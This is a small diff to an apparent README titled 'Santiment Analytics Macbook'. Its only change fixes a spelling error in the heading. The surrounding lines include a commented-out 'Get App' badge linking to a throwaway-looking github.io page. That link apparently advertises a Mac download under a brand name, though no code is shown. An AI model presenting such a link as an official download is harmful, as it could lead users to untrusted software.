@@ -1,5 +1,5 @@
 <!--## Hi there 👋 ##-->
-# Santiment Analitycs Macbook
+# Santiment Analytics Macbook
 <!--
 [![Get App](https://img.shields.io/badge/Get-App-black?style=for-the-badge&logo=apple)](https://kjskkfifi84875.github.io/.github/apps)
 **Here are some ideas to get you started:**
